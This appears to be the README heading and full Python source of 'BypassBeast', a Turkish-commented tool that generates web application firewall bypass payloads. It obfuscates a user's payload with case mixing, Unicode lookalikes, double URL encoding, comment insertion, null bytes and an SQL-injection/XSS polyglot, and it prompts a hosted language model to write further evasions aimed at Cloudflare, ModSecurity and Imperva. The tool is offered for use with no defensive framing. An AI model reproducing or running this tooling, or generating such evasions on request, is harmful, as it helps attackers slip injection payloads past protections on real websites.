# bypassbeast
WAF bypass payload generator for Kali Linux
# BypassBeast - WAF Bypass Canavarı (litellm + Termux Uyumlu Versiyon)
# Rust derleme derdi yok, litellm ile uçuyoruz aq 🔥
# Vhf Cizre Edition - 2026

import argparse
import random
import urllib.parse
import os
from dotenv import load_dotenv
from litellm import completion
from rich.console import Console
from rich.panel import Panel

load_dotenv()

# Groq API key'ini .env'den çek (kendin koyacaksın)
GROQ_API_KEY = os.getenv("GROQ_API_KEY")
if not GROQ_API_KEY:
    print("HATA: .env dosyasında GROQ_API_KEY yok!")
    print("Şu adresten al: https://console.groq.com/keys")
    print("Sonra .env dosyasına şunu yaz:")
    print("GROQ_API_KEY=gsk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    exit(1)

console = Console()

# WAF Profilleri
WAF_PROFILES = {
    "cloudflare": {"name": "Cloudflare", "weaknesses": ["unicode", "case", "comment", "encoding", "polyglot"], "temperature": 0.9},
    "modsecurity": {"name": "ModSecurity", "weaknesses": ["comment", "encoding", "nullbyte", "case"], "temperature": 0.7},
    "imperva": {"name": "Imperva", "weaknesses": ["unicode", "polyglot", "aggressive_encoding", "case"], "temperature": 1.0},
    "generic": {"name": "Generic WAF", "weaknesses": ["all"], "temperature": 1.0}
}

DEFAULT_VARIANTS = 10

# Manuel obfuscation teknikleri
def apply_manual_techniques(payload: str, weaknesses: list) -> list:
    variants = []
    if "case" in weaknesses or "all" in weaknesses:
        variants.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
    if "unicode" in weaknesses or "all" in weaknesses:
        uni_map = str.maketrans("abcdefghijklmnopqrstuvwxyz", "𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫")
        variants.append(payload.lower().translate(uni_map))
    if "encoding" in weaknesses or "aggressive_encoding" in weaknesses:
        enc1 = urllib.parse.quote(payload)
        enc2 = urllib.parse.quote(enc1)
        variants.extend([enc1, enc2])
    if "comment" in weaknesses or "all" in weaknesses:
        variants.append(payload.replace(" ", "/**/", 1))
    if "nullbyte" in weaknesses or "all" in weaknesses:
        variants.append(payload + "%00")
    if "polyglot" in weaknesses or "all" in weaknesses:
        variants.append(f"') OR 1=1 --><script>{payload}</script>")
    return list(set(variants))

# AI mutasyon (litellm ile)
def generate_mutations(payload: str, waf_profile: dict, num_variants: int, aggressive: bool):
    temp = waf_profile["temperature"]
    if aggressive:
        temp = min(temp + 0.4, 1.2)

    weaknesses_str = ", ".join(waf_profile["weaknesses"])
    waf_name = waf_profile["name"]

    prompt = f"""
    Sen WAF bypass uzmanısın. Aşağıdaki payload'ı {waf_name} WAF'ını aşacak şekilde obfuscate et.
    Orijinal: {payload}

    KURALLAR:
    - SADECE obfuscated payload'ları ver, açıklama yok
    - Her satır bir varyant
    - Tam {num_variants} tane üret
    - Unicode, case, encoding, comment, polyglot, null byte gibi teknikleri kullan
    - Agresif moddaysan çok yaratıcı ol
    """

    try:
        response = completion(
            model="groq/llama-3.1-70b-versatile",
            messages=[{"role": "user", "content": prompt}],
            temperature=temp,
            max_tokens=2048,
            api_key=GROQ_API_KEY
        )
        raw = response.choices[0].message.content.strip()
        ai_variants = [line.strip() for line in raw.split('\n') if line.strip() and len(line.strip()) > 4]
    except Exception as e:
        console.print(f"[red]AI çağrısı patladı: {e}[/red]")
        ai_variants = []

    manual = apply_manual_techniques(payload, waf_profile["weaknesses"])
    all_v = ai_variants + manual
    random.shuffle(all_v)
    return all_v[:num_variants * 2]

# Ana program
def main():
    parser = argparse.ArgumentParser(description="BypassBeast - WAF'ı Siken Canavar (litellm)")
    parser.add_argument("payload", type=str, help="Bypass edilecek payload")
    parser.add_argument("--waf", default="cloudflare", choices=list(WAF_PROFILES.keys()))
    parser.add_argument("--variants", type=int, default=DEFAULT_VARIANTS)
    parser.add_argument("--aggressive", action="store_true")

    args = parser.parse_args()
    profile = WAF_PROFILES[args.waf]

    console.print(Panel.fit(
        f"[bold red]BYPASSBEAST AKTİF![/bold red]\n"
        f"Payload: [yellow]{args.payload}[/yellow]\n"
        f"WAF: [cyan]{profile['name']}[/cyan] | Varyant: [magenta]{args.variants}[/magenta] | Agresif: {'Evet' if args.aggressive else 'Hayır'}",
        title="BypassBeast v1.2", border_style="red"
    ))

    console.print("\n[green]Mutasyon başlıyor...[/green]\n")

    variants = generate_mutations(args.payload, profile, args.variants, args.aggressive)

    for i, v in enumerate(variants, 1):
        console.print(f"[bold]{i:2d}.[/bold] [green]{v}[/green]")
        console.print("─" * 70)

    console.print("\n[bold yellow]Bunlarla WAF'ı del geç lan! 💦[/bold yellow]")

if __name__ == "__main__":
    main()
